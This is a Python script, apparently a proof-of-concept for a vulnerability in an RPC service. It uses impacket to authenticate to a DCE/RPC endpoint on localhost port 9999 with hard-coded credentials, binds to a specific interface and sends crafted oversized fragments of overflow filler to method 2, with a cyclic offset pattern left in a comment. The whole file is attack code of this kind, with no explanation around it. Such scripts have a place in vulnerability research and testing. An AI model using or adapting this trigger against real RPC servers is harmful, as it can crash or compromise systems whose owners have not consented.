from impacket.dcerpc.v5.rpcrt import *
# modify the impacket.dcerpc.v5.rpcrt as rpcrt.py
from impacket import uuid
from impacket.dcerpc.v5 import transport
import struct

import codecs
# ncadg_mq
# binding = "ncacn_np:%(host)s[\\pipe\\%(pipe)s]"
# binding = "ncadg_mq:%(host)s[\\pipe\\%(pipe)s]"
# binding %= {"host":"192.168.6.129","pipe":"spoolss","port":445}
# binding %= {"host":"127.0.0.1","pipe":"spoolss","port":445}
# binding %= {"host":"127.0.0.1","pipe":"spoolss","port":445}

def u32(number):
    return struct.pack("<I", number)

def p32(bytes):
    return struct.pack("<I", bytes)


# ncacn_ip_tcp
binding = "ncacn_ip_tcp:%(host)s[%(port)s]"
binding %= {"host":"127.0.0.1","pipe":"ROUTER","port":9999}

print("Using binding: %r" % binding)

trans = transport.DCERPCTransportFactory(binding)
trans.set_dport(9999)
dce = trans.DCERPC_class(trans)
# trans.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
# trans.set_max_fragment_size(0x10)
trans.set_credentials("link3","microsoft98(*(*")
trans.connect()


dce.set_auth_level(RPC_C_AUTHN_DEFAULT)
dce.set_max_tfrag(0x10)
dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)

print("connected to SMB")

def format_fragment_data(data, frag_size):
    data_len = len(data)
    frag_size -= 4
    if data_len < frag_size:
        return u32(len(data)//4) + data + u32(0)
    start_index = 0
    outer = b""
    while data_len > 0:
        outer += u32(frag_size//4)
        outer += data[start_index:start_index+frag_size]
        data_len -= frag_size
        start_index += frag_size
        if data_len < frag_size:
            # print(u32(data_len))
            outer += u32(data_len//4)
            outer += data[start_index:start_index+data_len]
            break

    return outer+u32(0)


# F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C
# dce.bind(uuid.uuidtup_to_bin(('0b6edbfa-4a24-4fc6-8a23-942b1eca65d1', '1.0')))
size_of_length = 4
size_of_header = 40
frag_size = 0x10b8-0x90
frag_length = frag_size + size_of_length + size_of_header
alloc_hint = frag_size + size_of_length
frag_offset = 24
dce.bind(uuid.uuidtup_to_bin(('f691b703-f681-47dc-afcd-034b2faab912', '1.0')))
dce.set_max_fragment_size(frag_size)
data = b'B'*((frag_size-8)*2)
# data = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak'
data = format_fragment_data(data, frag_size)
print(data)
# print(codecs.encode(data.encode('utf-8'),'hex'))
dce.call(2, data)
# dce.call(1337, 'B'*300)
# dce.send(MSRPCRequestHeader(b'B'*1000))

print(dce.recv())
print(dce.disconnect())
